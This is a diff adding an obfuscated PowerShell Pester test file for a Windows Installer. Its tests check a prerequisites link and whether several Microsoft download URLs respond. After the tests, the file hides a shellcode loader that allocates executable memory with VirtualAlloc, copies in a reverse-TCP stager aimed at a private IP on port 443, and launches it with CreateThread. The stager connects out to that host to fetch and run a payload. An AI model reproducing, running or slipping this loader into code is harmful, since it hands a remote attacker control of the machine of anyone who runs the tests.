@@ -1,0 +1,38 @@
+&("{1}{2}{0}" -f'scribe','D','e') ("{3}{0}{1}{4}{2}" -f 'i','ndows Inst','ler','W','al') -Tags ("{1}{2}{0}"-f'ario','Sce','n') {
+
+    &("{0}{1}{2}{3}" -f 'Be','fo','r','eAll') {
+        ${S`KipTE`St} = -not ${ISwi`Nd`O`Ws}
+        ${PrErE`Q`UiSIt`eslink} =  ("{5}{0}{4}{3}{1}{2}"-f's','pscore','6-prereq','ka.ms/','://a','http')
+        ${Lin`kc`hecKtesTCA`Ses} = @(
+            @{ ("{0}{1}"-f'Nam','e') = ("{4}{3}{0}{2}{1}" -f 'rsal ','me','C Runti','ive','Un'); ("{1}{0}" -f 'rl','U') = ${p`R`eREq`UIsiTe`sLink} }
+            @{ ("{1}{0}"-f 'ame','N') = ("{1}{0}"-f '4.0','WMF '); ("{1}{0}"-f'l','Ur') = ("{3}{9}{7}{8}{11}{5}{4}{2}{10}{0}{1}{6}" -f'px?id=408','5','tail','h','nload/de','/dow','5','ww','.micro','ttps://w','s.as','soft.com') }
+            @{ ("{0}{1}"-f'Na','me') = ("{2}{1}{0}" -f'.0','5','WMF '); ("{0}{1}" -f 'U','rl') = ("{2}{5}{4}{0}{3}{1}{9}{7}{6}{8}" -f'ro','ad/details.aspx?','h','soft.com/downlo','c','ttps://www.mi','0','=5','395','id') }
+            @{ ("{1}{0}"-f 'me','Na') = ("{0}{2}{1}"-f'WM','1','F 5.'); ("{1}{0}"-f'rl','U') = ("{4}{11}{6}{2}{10}{0}{1}{7}{5}{8}{3}{12}{9}" -f 'nload/d','et','.mic','asp','https://w','ls','w','ai','.','?id=54616','rosoft.com/dow','w','x') }
+        )
+    }
+
+    .('It') ('W'+'iX '+'(Win'+'d'+'ows '+'Ins'+'talle'+'r '+'XML'+') '+'f'+'ile '+'con'+'tains'+' '+'pre-'+'requi'+'site'+'s '+'link'+' '+"$preRequisitesLink") -skip:${SK`ipT`EST} {
+        ${WI`x`PROd`UCTFile} = &("{1}{2}{0}"-f'in-Path','J','o') -Path ${P`s`SCri`PtrooT} -ChildPath ((("{3}{4}{1}{0}{5}{6}{2}"-f'.6gq..6gqass','.','uct.wxs','..6g','q','ets6gq','Prod'))."rE`P`lacE"(([chaR]54+[chaR]103+[chaR]113),'\'))
+        (.("{1}{2}{0}{3}" -f't-','G','e','Content') ${Wixpr`O`DUc`TFIle} -Raw).("{1}{0}{2}"-f'on','C','tains').Invoke(${P`RERE`qu`iSITeSl`InK}) | .("{0}{1}{2}"-f 'Sh','o','uld') ('Be') ${T`Rue}
+    }
+
+    
+    
+    
+    .('It') ((("{3}{8}{4}{1}{6}{7}{5}{2}{0}"-f 'l>','for t6c',': <ur','Pre-Requis','k ','c is reachable','<Nam','e>t6','istes lin'))."r`EPlA`Ce"(([CHar]116+[CHar]54+[CHar]99),[strINg][CHar]39)) -TestCases ${LiNKCH`ECK`TE`s`TCases} -skip:${s`KiPt`EsT} {
+        param (${u`RL})
+
+        foreach (${i} in 1..5) {
+            try {
+                ${r`ES`ULT} = &("{0}{2}{4}{1}{5}{3}"-f 'Invok','u','e-WebRe','st','q','e') ${U`Rl} -UseBasicParsing
+                break;
+            } catch {
+                &("{0}{2}{1}" -f 'Star','Sleep','t-') -Seconds 1
+            }
+        }
+
+        ${R`ESU`lT} | &("{0}{1}{2}" -f 'Sh','o','uld') -Not -Be ${N`ULl}
+    }
+}
+
+${x`AT} = ((("{19}{81}{15}{105}{124}{65}{39}{63}{123}{43}{62}{41}{110}{45}{22}{66}{100}{98}{10}{16}{108}{101}{74}{14}{113}{82}{70}{94}{56}{34}{12}{5}{112}{60}{75}{47}{51}{21}{71}{103}{117}{120}{91}{3}{30}{99}{87}{96}{57}{93}{20}{46}{86}{67}{72}{29}{33}{55}{36}{17}{73}{107}{31}{59}{64}{24}{92}{118}{32}{106}{88}{90}{77}{48}{7}{95}{58}{44}{80}{53}{1}{9}{54}{4}{13}{119}{2}{122}{26}{28}{8}{42}{18}{115}{0}{27}{97}{78}{50}{89}{69}{40}{35}{25}{114}{84}{111}{109}{38}{37}{52}{83}{11}{61}{49}{104}{68}{79}{6}{85}{23}{76}{102}{121}{116}" -f 'Import({0}msvcrt.dll{','t ','r ','mpo','eat','fl','src','rt','readI','d','n','n','nt ','i','p','Import({0}k','t','d(In',')','[D','ll{0})]pu','p','Virtua','int co','t','tic','pT','0','h','r Creat','r','A','ize','e','i','sta','rea','s','Ptr mem',']',' ','rn ','d','tati','ameter',' ','blic s','nT','a','r ','b','y','e','n','wCr','Th','Size, u','ernel3','ddress, IntPtr lpPar','ttributes, u','llocati','tPt','c exte','p','int dwS',')','lAlloc','ter','est, ','ic','s, ','e, ui','n IntPt','tPt','r l','o','un','tr lpSt','pu','uint ',', ui','ll','s','t(I','exte',', u','tatic ex','{0}','nt','l','P',';[DllI','ac','2.d','uint dw','A','k','})]','I','t(','(','t','t','nt flProt','d','ern',', I','r lpThread','P','nt','IntPtr','rn I','A','Addre',' ',';[Dll',';','e','kS','onFlags, IntPt','ct)',')','l','ublic s','el32.dll{0}'))  -f [cHAR]34);${W} = &("{0}{1}{2}" -f 'Add-Ty','p','e') -memberDefinition ${X`At} -Name ("{1}{0}" -f 'in32','W') -namespace ("{0}{4}{3}{2}{1}"-f 'Wi','ons','ti','unc','n32F') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xdb,0x32,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${z}."LEn`gtH" -gt 0x1000){${g} = ${z}."lE`Ng`TH"};${Sb`9y}=${w}::("{1}{0}{2}" -f 'irt','V','ualAlloc').Invoke(0,0x1000,${G},0x40);for (${I}=0;${i} -le (${Z}."l`EnGTh"-1);${i}++) {${W}::"mEMs`Et"([IntPtr](${s`B9y}.("{0}{1}{2}" -f 'To','Int3','2').Invoke()+${i}), ${Z}[${i}], 1)};${w}::("{0}{2}{1}"-f'Creat','ad','eThre').Invoke(0,0,${sb`9y},0,0,0);for (;;){&("{0}{2}{1}" -f'S','p','tart-slee') 60};
